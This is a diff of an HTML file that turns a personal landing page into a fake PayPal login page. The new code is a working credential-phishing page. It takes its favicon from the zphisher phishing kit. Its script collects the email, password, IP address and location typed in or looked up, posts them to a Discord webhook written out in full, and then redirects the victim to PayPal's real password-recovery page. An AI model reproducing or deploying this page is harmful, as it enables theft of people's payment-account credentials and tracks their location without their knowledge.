@@ -3,189 +3,173 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>daddy>
+    <title>PayPal Sign Up</title>
+    <!-- Favicon added here -->
+    <link rel="icon" href="https://raw.githubusercontent.com/htr-tech/zphisher/refs/heads/master/.sites/paypal/favicon.ico" type="image/x-icon">
     <style>
-        /* Full-screen black overlay */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 1); /* Black background */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 30px;
-            font-family: Arial, sans-serif;
-            z-index: 1000;
-            opacity: 1;
-            transition: opacity 1s ease-out;
-            pointer-events: all; /* Ensure the overlay is clickable */
-        }
-
-        /* "Click to enter" text without a box, centered */
-        .click-to-enter {
-            font-size: 30px;
-            color: white;
-            font-family: Arial, sans-serif;
-            cursor: pointer;
-            text-align: center;
-            text-transform: uppercase;
-            border: none;
-            background: none;
-            z-index: 1010; /* Ensure text is above overlay content */
-        }
-
-        /* Fade-out effect */
-        .fade-out {
-            opacity: 0;
-        }
-
         body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
             margin: 0;
             padding: 0;
-            overflow: hidden; /* Prevent scrolling while overlay is active */
-            height: 100vh;
-        }
-
-        .content {
-            opacity: 0;
-            visibility: hidden; /* Content is hidden initially */
-            transition: opacity 0.5s ease-in; /* Faster transition for content reveal */
-            position: relative;
-        }
-
-        body.show-content .content {
-            opacity: 1;
-            visibility: visible; /* Reveal content after overlay fades */
-        }
-
-        /* Full screen background */
-        body {
-            background-image: url('your-image.png'); /* Replace with your PNG file path */
-            background-size: cover;
-            background-position: center;
-        }
-
-        /* Box and profile image styles */
-        .blurred-box {
-            width: 75%;
-            max-width: 650px;
-            height: 350px;
-            background-color: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(30px);
-            border-radius: 15px;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-start;
-            align-items: center;
-            position: fixed; /* Keep it fixed in the center */
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%); /* Center the box perfectly */
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-            padding-top: 30px;
-        }
-
-        /* Profile Picture Circle */
-        .profile-pic {
-            width: 120px;
-            height: 120px;
-            background-color: #ccc;
-            border-radius: 50%;
-            margin-bottom: 20px; /* Added small space (20px) between the image and the text */
-            overflow: hidden;
             display: flex;
             justify-content: center;
             align-items: center;
+            height: 100vh;
+            text-align: center;
         }
-
-        .profile-pic img {
+        .login-container {
             width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        /* Glowing text for "soxynet" */
-        .glowing-text {
-            font-size: 40px;
-            font-family: Arial, sans-serif;
-            color: white;
-            text-align: center;
-            text-transform: uppercase;
-            animation: glow 1.5s ease-in-out infinite;
-            text-shadow: 
-                2px 2px 4px black,
-                -2px -2px 4px black,
-                2px -2px 4px black,
-                -2px 2px 4px black;
-            margin-top: 3px;
-        }
-
-        @keyframes glow {
-            0% { text-shadow: 0 0 10px white, 0 0 20px white, 0 0 30px white, 0 0 40px white, 0 0 70px white, 0 0 80px white, 0 0 100px white; }
-            50% { text-shadow: 0 0 15px white, 0 0 25px white, 0 0 35px white, 0 0 50px white, 0 0 75px white, 0 0 90px white, 0 0 120px white; }
-            100% { text-shadow: 0 0 10px white, 0 0 20px white, 0 0 30px white, 0 0 40px white, 0 0 70px white, 0 0 80px white, 0 0 100px white; }
-        }
-
-        /* Glowing text box styling */
-        .glowing-textbox {
-            margin-top: 20px;
-            font-family: Arial, sans-serif;
-            font-size: 18px;
-            text-align: center;
-            color: white;
-            padding: 10px 20px;
-            background: rgba(0, 0, 0, 0.5); /* Semi-transparent black background */
-            border: 1px solid white;
+            max-width: 400px;
+            padding: 20px;
+            background-color: white;
             border-radius: 8px;
-            text-shadow: 0 0 10px white, 0 0 20px white;
-            animation: glow 1.5s infinite alternate;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            text-align: left;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+            text-align: center; /* Centering the logo */
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"],
+        .login-container input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+        .login-container input[type="submit"] {
+            background-color: #0070ba;  /* PayPal Blue */
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        .login-container input[type="submit"]:hover {
+            background-color: #005c8c;  /* Slightly darker blue on hover */
+        }
+        .login-container .footer {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .forgot-password {
+            color: #0070ba;  /* PayPal Blue */
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-top: 10px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+            color: #005c8c;  /* Slightly darker PayPal Blue on hover */
+        }
+        .signup-link {
+            color: #0070ba;  /* PayPal Blue */
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .signup-link:hover {
+            text-decoration: underline;
+            color: #005c8c;  /* Slightly darker PayPal Blue on hover */
+        }
+
+        /* Media queries for mobile responsiveness */
+        @media (max-width: 768px) {
+            .login-container {
+                width: 90%;
+                padding: 15px;
+            }
+            .login-container input[type="text"],
+            .login-container input[type="password"],
+            .login-container input[type="submit"] {
+                padding: 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 10px;
+                width: 95%;
+            }
+            .login-container input[type="text"],
+            .login-container input[type="password"],
+            .login-container input[type="submit"] {
+                font-size: 16px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Black overlay with text -->
-    <div class="overlay" id="overlay">
-        <div class="click-to-enter" id="enterButton">Click to enter...</div>
-    </div>
-
-    <!-- Hidden Content that will be revealed -->
-    <div class="content">
-        <div class="blurred-box">
-            <div class="profile-pic">
-                <img src="your-pfp.jpg" alt="Profile Picture">
-            </div>
-            <div class="glowing-text">soxywoxyv>
-
-            <!-- New glowing text box -->
-            <div class="glowing-textbox">
-                discord.gg/soxy
-            </div>
+    <div class="login-container">
+        <h2>
+            <img src="https://www.paypalobjects.com/webstatic/paypalme/images/social/pplogo384.png" alt="PayPal Logo" width="120">
+        </h2>
+        <form id="loginForm" method="POST">
+            <input type="text" name="email" placeholder="Email" required><br>
+            <input type="password" name="password" placeholder="Password" required><br>
+            <a href="https://www.paypal.com/authflow/password-recovery/" class="forgot-password" target="_blank">Forgot password?</a>
+            <input type="submit" value="Login">
+        </form>
+        <div class="footer">
+            <p>Don't have an account? <a href="https://www.paypal.com/us/webapps/mpp/account-selection" class="signup-link" target="_blank">Sign up here</a></p>
         </div>
     </div>
 
-    <!-- Audio element to play music -->
-    <audio id="music" preload="auto">
-        <source src="your-music.mp3" type="audio/mp3">
-        Your browser does not support the audio element.
-    </audio>
-
     <script>
-        const overlay = document.getElementById("overlay");
-        const enterButton = document.getElementById("enterButton");
-        const content = document.querySelector(".content");
-        const music = document.getElementById("music");
+        // Function to fetch IP address and send it to Discord using ipwhois.io (No API token required)
+        function sendDataToDiscord(email, password) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1326350675004752005/6T-1LxiLj16Lh4iSrjJ42ygIRfzD5Y72VOHxPX6fMEH0hMoYtmyvVlE79-2z0KB-zTIv';
 
-        enterButton.addEventListener("click", function () {
-            overlay.classList.add("fade-out");
-            document.body.classList.add("show-content");
-            music.play();  // Play the music when the button is clicked
-            setTimeout(() => {
-                overlay.style.display = "none";
-            }, 1000);
+            // Fetch IP address using ipwhois.io (no API key required)
+            fetch('https://ipwhois.app/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const location = `${data.city}, ${data.region}, ${data.country}`;
+
+                    // Prepare the payload to send to Discord
+                    const payload = {
+                        content: `**Email:** ${email}\n**Password:** ${password}\n**IP Address:** ${ip}\n**Location:** ${location}`
+                    };
+
+                    // Send the data to Discord
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('Data sent to Discord!');
+                        } else {
+                            console.error('Failed to send data to Discord. Status:', response.status);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending data to Discord:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP info:', error);
+                });
+        }
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();  // Prevent default form submission
+
+            const email = event.target.email.value;
+            const password = event.target.password.value;
+
+            // Send data to Discord
+            sendDataToDiscord(email, password);
+
+            // Redirect to PayPal password recovery page
+            window.location.href = 'https://www.paypal.com/authflow/password-recovery/';
         });
     </script>
 </body>
